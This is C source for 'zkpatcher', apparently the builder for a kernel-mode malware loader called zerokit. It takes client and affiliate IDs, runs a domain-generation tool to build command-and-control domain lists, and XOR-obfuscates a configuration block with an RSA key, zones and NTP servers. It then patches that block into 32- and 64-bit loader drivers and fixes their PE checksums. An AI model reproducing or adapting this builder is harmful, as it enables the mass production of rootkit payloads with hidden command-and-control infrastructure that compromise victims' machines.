#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../../../shared_code/platform.h"
#include "../../../shared_code/types.h"
#include "../../../shared_code/native.h"
#include "../../../shared_code/base64.h"
#include "../../../shared_code/timing.h"
#include "../../../shared_code/havege.h"
#include "../../../shared_code/crc64.h"
#include "../../../shared_code/utils.h"
#include "../../../shared_code/config.h"

#include "../../../shared_code/bignum.h"
#include "../../../shared_code/bn_mul.h"
#include "../../../shared_code/rsa.h"

#define MPI_USE_FILE_IO 1
#define USE_STRING_IO 1
#define USE_STRING_WRITE_IO 1
#include "../../../shared_code/bignum.c"
#include "../../../shared_code/rsa.c"

#include "../../../shared_code/timing.c"
#include "../../../shared_code/havege.c"

#include "../../../shared_code/pe.c"

#define ZKPATCHER_VERSION "0.8.7"

#include "../../../loader/mod_shared/mod_configuration.h"

typedef struct _global_config
{
    uint16_t rtr_names_count;
    uint32_t rtr_names_timeout;
    uint32_t rtr_end_of_names_timout;
    uint32_t rtr_zones_timeout;
    uint16_t rtr_all_names_attempts;
    uint32_t rtr_all_names_timeout;
    uint32_t rtr_names_lifetime;
    uint32_t rtr_check_tasks_timeout;

    uint16_t gen_min_name_len;
    uint16_t gen_max_name_len;
    uint32_t gen_unique_period;
    uint32_t fs_cache_size;
    uint32_t fs_size;
} global_config_t;

global_config_t gGlobalConfig;

void* handleConfigParameter(char* keyName, int* pValueType)
{
    void* pVal = NULL;

    if (strcmp(keyName, "rtr_names_count") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_names_count; *pValueType = TYPE_UINT16;
    }
    else if (strcmp(keyName, "rtr_names_timeout") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_names_timeout; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "rtr_end_of_names_timout") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_end_of_names_timout; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "rtr_zones_timeout") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_zones_timeout; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "rtr_all_names_attempts") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_all_names_attempts; *pValueType = TYPE_UINT16;
    }
    else if (strcmp(keyName, "rtr_all_names_timeout") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_all_names_timeout; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "rtr_names_lifetime") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_names_lifetime; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "rtr_check_tasks_timeout") == 0) {
        pVal = (void*)&gGlobalConfig.rtr_check_tasks_timeout; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "gen_min_name_len") == 0) {
        pVal = (void*)&gGlobalConfig.gen_min_name_len; *pValueType = TYPE_UINT16;
    }
    else if (strcmp(keyName, "gen_max_name_len") == 0) {
        pVal = (void*)&gGlobalConfig.gen_max_name_len; *pValueType = TYPE_UINT16;
    }
    else if (strcmp(keyName, "gen_unique_period") == 0) {
        pVal = (void*)&gGlobalConfig.gen_unique_period; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "fs_cache_size") == 0) {
        pVal = (void*)&gGlobalConfig.fs_cache_size; *pValueType = TYPE_UINT32;
    }
    else if (strcmp(keyName, "fs_size") == 0) {
        pVal = (void*)&gGlobalConfig.fs_size; *pValueType = TYPE_UINT32;
    }

    return pVal;
}

char* findDataBlock(char* data, size_t size, char* blockName, size_t blockSize)
{
    char* itr = data;
    char* blockItr;
    char* end = data + size - blockSize;

    for ( ; itr < end; ++itr) {
        if (*itr == blockName[0]) {
            if (itr[1] == blockName[1] && itr[2] == blockName[2]) {
                blockItr = blockName + 3;
                itr += 3;

                for ( ; *blockItr != 0; ++blockItr, ++itr) {
                    if (*blockItr != *itr)
                        break;
                }

                if (*blockItr == 0)
                    return (itr - blockSize);
            }
        }
    }

    return 0;
}

#define BLOCK_SIG "<config>"

typedef struct cmd_options
{
    uint32_t sId;      // Идентификатор клиента
    uint32_t affId;         // Аффид.
    uint32_t subId;         // Сабид.
    char* modsPath;         // Путь с модами.
    char* outPath;          // Путь к результирующему файлу.
    uint32_t date;          // Стартовая дата для генерации имён доменов.
    char* zones;            // Список зон, разделённых точкой с запятой.
    char* ntpServers;       // Список NTP-серверов разделённых точкой с запятой.
    int noisy;              // Наличие параметра позволит выводить подробную информацию. Иначе буду выводится только имена файлов.
} cmd_options_t, *pcmd_options_t;

cmd_options_t gCmdOptions;

cmd_line_info_t cmdLineInfo = {9,
{
    {{"i", "sid"}, "ServerId for generate zerokit pack", "Specify integer value for sid", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.sId},
    {{"a", "affid"}, "AffId for generate zerokit pack", "Specify integer value for affid", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.affId},
    {{"s", "subid"}, "SubId for generate zerokit pack", "Specify integer value for subid", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.subId},
    {{"m", "mods"}, "Path with clean mods", "Specify correct path", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.modsPath},
    {{"o", "out"}, "Path where output files will be placed", "Specify correct path", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.outPath},
    {{"d", "date"}, "Start date in UnixTime format (UTC+0)", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.date},
    {{"z", "zones"}, "List of zones for domains", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.zones},
    {{"t", "ntplist"}, "List of NTP-servers", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.ntpServers},
    {{"n", "noisy"}, "Noisy mode", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_BOOLEAN, (void*)&gCmdOptions.noisy},
}
};

#define NOISY_PRINTF(x) if (gCmdOptions.noisy) printf x;
#define QUIET_PRINTF(x) if (!gCmdOptions.noisy) printf x;

// Первым параметром командной строки идёт путь к файлу ldr.conf, вторым ldrsrv.conf
int __cdecl main(int argc, char** argv)
{
    int i;
    size_t sz;
    int ret = EXIT_FAILURE;
    FILE* keyFile;
    char* ptr;
    char* end;
    havege_state_t hs;
    uint8_t* loader32Data = NULL;
    size_t loader32DataSize;
    uint8_t* loader32Block;
    uint8_t* loader64Data = NULL;
    size_t loader64DataSize;
    uint8_t* loader64Block;
    configuration_t config;
    char filePath[MAX_PATH];
    rsa_context_t rsa;
    char rootPath[MAX_PATH];
    char clientPath[MAX_PATH];
    char affidPath[MAX_PATH];
    char outPath32[MAX_PATH];
    char outPath64[MAX_PATH];
    char commandLine[1024];
    char tmp[32];
    int genMod = 0;
    FILE* domaingenPipe;
    char names[4096];
    char completeNames[1024];
    uint32_t dateForGen;

    memset(&gCmdOptions, 0, sizeof(cmd_options_t));
    if (config_parse_cmdline(argc, argv, &cmdLineInfo, ZKPATCHER_VERSION) != ERR_OK) {
        return EXIT_FAILURE;
    }

    NOISY_PRINTF(("\n--- zkpatcher ---\n\n"));

    memset(&config, 0, sizeof(configuration_t));

    do {
        GetModuleFileName(NULL, rootPath, MAX_PATH - 1);

        ptr = rootPath + strlen(rootPath);
        // Получаем путь \bin.
        for ( ; *ptr != '\\' && *ptr != '/'; --ptr);
        // Получаем корень.
        *ptr = '\0';

        // Делаем текущей директорией путь, откуда запустились.
        if (utils_set_current_directory(rootPath) != ERR_OK) {
            NOISY_PRINTF(("Failed\n  ! Can't set current directory\n\n"));
            break;
        }

        ptr -=3;
        // Проверям нашу папку, если это не bin, то скорее всего нас запустиил не с той папки.
        if (_stricmp(ptr, "bin") != 0) {
            NOISY_PRINTF(("Failed\n  ! Path of builder is incorrect\n\n"));
            break;
        }

        *ptr = '\0';

        // Генерируем путь к папке клиента.
        strcpy_s(clientPath, MAX_PATH, rootPath);
        strcat_s(clientPath, MAX_PATH, "sids\\");
        // В параметре reserved1 находится идентификатор клиента.
        _itoa(gCmdOptions.sId, tmp, 10);
        strcat_s(clientPath, MAX_PATH, tmp);
        strcat_s(clientPath, MAX_PATH, "\\");

        // Генерируем путь до папки аффида.
        strcpy_s(affidPath, MAX_PATH, clientPath);
        _itoa(gCmdOptions.affId, tmp, 10);
        strcat_s(affidPath, MAX_PATH, tmp);
        strcat_s(affidPath, MAX_PATH, "\\");

        memset(&gGlobalConfig, 0, sizeof(global_config_t));

        utils_build_path(filePath, affidPath, "loader.conf", 0);

        // Читаем конфигурацию лоадера из zerokit.conf.
        NOISY_PRINTF(("Loading config file %s... ", filePath));
        if (config_load(filePath, line_parser_conf, line_parser_conf_done, handleConfigParameter) != 0) {
            NOISY_PRINTF(("Failed\n  ! Can't load config %s\n\n", filePath));
            break;
        }

        utils_build_path(filePath, clientPath, "skey.public", 0);

        // Читаем открытый ключ из файла skey.public.
        NOISY_PRINTF(("OK\nLoading Server Public Key from %s... ", filePath));
        if (utils_read_file(filePath, (uint8_t**)&ptr, &sz) != ERR_OK) {
            fprintf_s(stdout, "Failed\n  ! Can't load\n\n");
            break;
        }

        memcpy(config.publicSKey, ptr, sz);
        free(ptr);

        utils_build_path(filePath, clientPath, "key.public", 0);
        NOISY_PRINTF(("OK\nLoading public key from file %s... ", filePath));
        if ((keyFile = fopen(filePath, "rb")) == NULL) {
            NOISY_PRINTF(("Failed\n  ! Can't open %s\n\n", filePath));
            break;
        }

        utils_build_path(filePath, gCmdOptions.modsPath, "ldr32.sys", 0);
        utils_build_path(outPath32, gCmdOptions.outPath, "ldr32.sys", 0);

        NOISY_PRINTF(("OK\nChecking file %s for existence... ", filePath));
        if (utils_is_file_exists(filePath) == ERR_BAD) {
            NOISY_PRINTF(("None\n", filePath));
            genMod = 1;
            utils_build_path(outPath32, gCmdOptions.outPath, "configuration.z", 0);
        }
        else {
            NOISY_PRINTF(("OK\n", filePath));
        }

        if (genMod == 0) {
            NOISY_PRINTF(("Reading file %s... ", filePath));
            if (utils_read_file(filePath, &loader32Data, &loader32DataSize) != 0) {
                NOISY_PRINTF(("Failed\n  ! Can't load file %s\n\n", filePath));
                return EXIT_FAILURE;
            }

            utils_build_path(filePath, gCmdOptions.modsPath, "ldr64.sys", 0);
            utils_build_path(outPath64, gCmdOptions.outPath, "ldr64.sys", 0);

            NOISY_PRINTF(("OK\nReading file %s... ", filePath));
            if (utils_read_file(filePath, &loader64Data, &loader64DataSize) != 0) {
                NOISY_PRINTF(("Failed\n  ! Can't load file %s\n\n", filePath));
                return EXIT_FAILURE;
            }

            NOISY_PRINTF(("OK\nSearching block '%s' in 32bit Loader... ", BLOCK_SIG));
            loader32Block = (uint8_t*)findDataBlock((char*)loader32Data, loader32DataSize, BLOCK_SIG, strlen(BLOCK_SIG));
            if (loader32Block == NULL) {
                NOISY_PRINTF(("Failed\n  ! Can't found data block '%s'\n\n", BLOCK_SIG));
                return EXIT_FAILURE;
            }

            NOISY_PRINTF(("Found!\nSearching block '%s' in 64bit Loader... ", BLOCK_SIG));
            loader64Block = (uint8_t*)findDataBlock((char*)loader64Data, loader64DataSize, BLOCK_SIG, strlen(BLOCK_SIG));
            if (loader64Block == NULL) {
                NOISY_PRINTF(("Failed\n  ! Can't found data block '%s'\n\n", BLOCK_SIG));
                return EXIT_FAILURE;
            }
            NOISY_PRINTF(("Found!\n"));
        }

        havege_init(&hs);
        rsa_init(&rsa, RSA_PKCS_V15, 0);

        NOISY_PRINTF(("Reading RSA public key... "));
        if ((ret = mpi_read_file(&rsa.N, 16, keyFile)) != 0 || (ret = mpi_read_file(&rsa.E, 16, keyFile)) != 0) {
            NOISY_PRINTF(("Failed\n  ! Can't read MPI values\n\n"));
            break;
        }

        rsa.len = (mpi_msb(&rsa.N) + 7) >> 3;
        fclose(keyFile);

        NOISY_PRINTF(("OK\nBuilding configuration... "));
        ptr = config.publicKey;

        sz = mpi_size(&rsa.N); *(uint16_t*)ptr = (uint16_t)sz; ptr += 2; mpi_write_binary(&rsa.N, ptr, sz); ptr += sz; 
        sz = mpi_size(&rsa.E); *(uint16_t*)ptr = (uint16_t)sz; ptr += 2; mpi_write_binary(&rsa.E, ptr, sz); ptr += sz;

        havege_rand(&hs, (uint8_t*)ptr, sizeof(config.publicKey) - (ptr - (char*)config.publicKey));

        config.sid = gCmdOptions.sId;
        config.affid = gCmdOptions.affId;
        config.subid = gCmdOptions.subId;
        config.rtr_names_count = gGlobalConfig.rtr_names_count;
        config.rtr_names_timeout = gGlobalConfig.rtr_names_timeout;
        config.rtr_end_of_names_timout = gGlobalConfig.rtr_end_of_names_timout;
        config.rtr_zones_timeout = gGlobalConfig.rtr_zones_timeout;
        config.rtr_all_names_attempts = gGlobalConfig.rtr_all_names_attempts;
        config.rtr_all_names_timeout = gGlobalConfig.rtr_all_names_timeout;
        config.rtr_names_lifetime = gGlobalConfig.rtr_names_lifetime;
        config.rtr_check_tasks_timeout = gGlobalConfig.rtr_check_tasks_timeout;

        config.gen_min_name_len = gGlobalConfig.gen_min_name_len;
        config.gen_max_name_len = gGlobalConfig.gen_max_name_len;
        config.gen_unique_period = gGlobalConfig.gen_unique_period;
        config.fsCacheSize = gGlobalConfig.fs_cache_size;
        config.fsSize = gGlobalConfig.fs_size;

        // Генерируем список доменов
        // 1. Для начала генерируем список доменов на предыдущий период. Если длина списка превышает половину максимального количества 
        //    данных для имён, то завершаем формированием списка.
        // 2. Вичисляем предыдущую дату для генерации в зависимости от параметров и генерируем список доменов, и прибавляем его к текущему списку слева.
        //    Если суммарная длина превышает максимальный размер буфера для имён, то извлекаем список слева и заверашем формирование списка.
        // 3. Оставляем список слева и переходим на шаг 2.

        utils_build_path(filePath, clientPath, "key.public", 0);
        dateForGen = gCmdOptions.date;
        for ( ; ; ) {
            char tmpNames[2048];

            dateForGen -= (gGlobalConfig.gen_unique_period * 3600) * gGlobalConfig.rtr_names_count;

            sprintf_s(commandLine, 1024, "domaingen.exe -a=%u -n=%u -l=%u -h=%u -p=%u -d=%u -k=\"%s\"", gCmdOptions.affId, gGlobalConfig.rtr_names_count, 
                gGlobalConfig.gen_min_name_len, gGlobalConfig.gen_max_name_len, gGlobalConfig.gen_unique_period, dateForGen, filePath);

            NOISY_PRINTF(("\nCommand: %s\n", commandLine));

            domaingenPipe = utils_plaunch(commandLine, "r");

            if (domaingenPipe == NULL) {
                NOISY_PRINTF(("Failed\n  ! domaingen pipe open error\n\n"));
                break;
            }

            if (fgets(names, sizeof(names), domaingenPipe) == NULL) {
                utils_pdestroy(domaingenPipe);
                NOISY_PRINTF(("Failed\n  ! Can't read data from domaingen output\n\n"));
                break;
            }

            utils_pdestroy(domaingenPipe);

            if (names[strlen(names) - 1] = 0x0A) {
                names[strlen(names) - 1] = '\0';
            }

            if (names[strlen(names) - 1] = 0x0D) {
                names[strlen(names) - 1] = '\0';
            }

            if (strlen(names) > 1023) {
                NOISY_PRINTF(("Failed\n  ! Too many names for generation or length of names are very long. You must decrease number of names or length\n\n"));
                break;
            }

            strcpy_s(tmpNames, sizeof(tmpNames), completeNames);
            strcat_s(tmpNames, sizeof(tmpNames), names);

            if (strlen(tmpNames) > 1023) {
                break;
            }

            strcpy_s(completeNames, sizeof(completeNames), tmpNames);
        }

        // Копируем список доменых имён.
        strcpy_s(config.names, sizeof(config.names), completeNames);
        if (config.names[strlen(config.names) - 1] != ';') {
            strcat_s(config.names, sizeof(config.names), ";");
        }
        ptr = (char*)config.names;
        end = ptr + sizeof(config.names);
        for ( ; *ptr != '\0'; ++ptr) {
            if (*ptr == ';') {
                *ptr = '\0';
            }
        }
        for (++ptr ; ptr < end; ++ptr) { // Перезаписываем идентификатор блока
            havege_rand(&hs, (uint8_t*)ptr, end - ptr);
        }

        // Копируемы списко зон.
        strcpy_s(config.zones, sizeof(config.zones), gCmdOptions.zones);
        if (config.zones[strlen(config.zones) - 1] != ';') {
            strcat_s(config.zones, sizeof(config.zones), ";");
        }
        ptr = (char*)config.zones;
        end = ptr + sizeof(config.zones);
        for ( ; *ptr != '\0'; ++ptr) {
            if (*ptr == ';') {
                *ptr = '\0';
            }
        }
        for (++ptr ; ptr < end; ++ptr) { // Перезаписываем идентификатор блока
            havege_rand(&hs, (uint8_t*)ptr, end - ptr);
        }

        // Копируемы списко NTP-серверов.
        strcpy_s(config.ntpServers, sizeof(config.ntpServers), gCmdOptions.ntpServers);
        if (config.ntpServers[strlen(config.ntpServers) - 1] != ';') {
            strcat_s(config.ntpServers, sizeof(config.ntpServers), ";");
        }
        ptr = (char*)config.ntpServers;
        end = ptr + sizeof(config.ntpServers);
        for ( ; *ptr != '\0'; ++ptr) {
            if (*ptr == ';') {
                *ptr = '\0';
            }
        }
        for (++ptr ; ptr < end; ++ptr) { // Перезаписываем идентификатор блока
            havege_rand(&hs, (uint8_t*)ptr, end - ptr);
        }

        // Шифруем блок с настройками
        havege_rand(&hs, &config, sizeof(config.block_header)); // Перезаписываем идентификатор блока
        ptr = (uint8_t*)(&config) + sizeof(config.block_header);
        for (i = 0; i < sizeof(configuration_t) - sizeof(config.block_header); ++i, ++ptr) {
            *ptr ^= ((uint8_t*)(&config))[i % sizeof(config.block_header)]; 
        }

        if (genMod == 1) {
            NOISY_PRINTF(("OK\nSaving configuration to %s... ", outPath32));
            if (utils_save_file(outPath32, (uint8_t*)&config, sizeof(configuration_t)) != 0) {
                NOISY_PRINTF(("Failed\n  ! Can't save file %s\n\n", outPath32));
                return EXIT_FAILURE;
            }
        }
        else {
            NOISY_PRINTF(("OK\nWriting parameters to 32bit module... "));
            memcpy(loader32Block, &config, sizeof(configuration_t));

            NOISY_PRINTF(("OK\nWriting parameters to 64bit module... "));
            memcpy(loader64Block, &config, sizeof(configuration_t));

            NOISY_PRINTF(("OK\nSaving patched 32bit module to %s... ", outPath32));
            if (utils_save_file(outPath32, loader32Data, loader32DataSize) != 0) {
                NOISY_PRINTF(("Failed\n  ! Can't save file %s\n\n", outPath32));
                return EXIT_FAILURE;
            }

            NOISY_PRINTF(("OK\nFixing 32bit module checksum... ", outPath32));
            if (FixHeaderCheckSum(outPath32) == 0) {
                NOISY_PRINTF(("Failed\n  ! Can't fix checksum %s\n\n", outPath32));
                return EXIT_FAILURE;
            }

            // Записываем половины ключей в лоадер
            NOISY_PRINTF(("OK\nSaving patched 64bit module to %s... ", outPath64));
            if (utils_save_file(outPath64, loader64Data, loader64DataSize) != 0) {
                NOISY_PRINTF(("Failed\n  ! Can't save file %s\n\n", outPath64));
                return EXIT_FAILURE;
            }

            NOISY_PRINTF(("OK\nFixing 64bit module checksum... ", outPath64));
            if (FixHeaderCheckSum(outPath64) == 0) {
                NOISY_PRINTF(("Failed\n  ! Can't fix checksum %s\n\n", outPath64));
                return EXIT_FAILURE;
            }
        }

        NOISY_PRINTF(("OK\n"));

        ret = EXIT_SUCCESS;
    } while (0);

    if (loader32Data != NULL) {
        free(loader32Data);
    }

    if (loader64Data != NULL) {
        free(loader64Data);
    }

    rsa_free(&rsa);

    NOISY_PRINTF(("\n--- zkpatcher ---\n"));

    return ret;
}
